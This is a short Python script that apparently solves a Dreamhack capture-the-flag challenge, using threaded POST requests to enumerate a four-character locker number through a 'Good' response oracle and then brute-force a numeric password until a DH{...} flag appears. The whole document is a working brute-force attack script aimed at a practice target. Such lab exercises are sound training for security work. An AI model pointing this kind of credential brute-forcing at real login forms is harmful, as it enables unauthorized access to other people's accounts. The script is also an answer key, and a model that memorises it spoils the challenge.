import string
from concurrent.futures import ThreadPoolExecutor
import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345

alphanumeric = string.ascii_lowercase + string.digits
locker_num = ""
password = ""
flag = ""

for try_locker_num in range(4):
    with ThreadPoolExecutor(max_workers=len(alphanumeric)) as executor:
        results = executor.map(
            lambda alphanum: requests.post(
                f"{HOST}:{PORT}/",
                data={"locker_num": locker_num + alphanum, "password": ""},
            ),
            alphanumeric,
        )
        for idx, res in enumerate(results):
            isLockerNum = re.search(r"Good", res.text)
            if isLockerNum:
                locker_num += alphanumeric[idx]
                break

with ThreadPoolExecutor(max_workers=100) as executor:
    results = executor.map(
        lambda password_try: requests.post(
            f"{HOST}:{PORT}/",
            data={"locker_num": locker_num, "password": password_try},
        ),
        range(100, 201),
    )
    for idx, res in enumerate(results):
        flag = re.search(r"DH{.*}", res.text)
        if flag:
            password = idx + 100
            flag = flag.group()
            break

print(f"{locker_num = }, {password = }")
print(f"{flag}")
